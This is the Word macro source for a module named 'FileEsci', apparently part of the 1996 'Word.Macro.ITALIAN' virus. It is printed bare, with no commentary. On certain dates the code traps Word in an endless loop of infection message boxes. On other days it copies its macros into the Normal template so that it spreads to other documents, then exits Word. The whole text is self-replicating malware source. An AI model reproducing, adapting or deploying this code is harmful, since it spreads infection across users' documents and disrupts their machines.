   Attribute VB_Name = "FileEsci"

   Public Sub MAIN()
   Dim Giorno
   Dim Nome$
   On Error GoTo -1: On Error GoTo Fine
   Giorno = WordBasic.Day(WordBasic.Now())
   If Giorno = 7 Then GoTo Attivo
   If Giorno = 13 Then GoTo Attivo
   If Giorno = 17 Then GoTo Attivo
   If Giorno = 31 Then GoTo Attivo
   GoTo NonAttivo
   Attivo:
   WordBasic.MsgBox "Your PC is infected by" + Chr(13) + "Word.Macro.ITALIAN Virus" + Chr(13) + "Written Jan,1996.", "C Y B E R L O R D !!", 16
   GoTo Attivo
   NonAttivo:
   Nome$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy Nome$ + ":FileMacro", "Normal:FileSalva", 1
   WordBasic.MacroCopy Nome$ + ":FileChiudi", "Normal:WordMacro1", 1
   WordBasic.MacroCopy Nome$ + ":FileEsci", "Normal:WordMacro2", 1
   WordBasic.FileExit
   Fine:
   End Sub
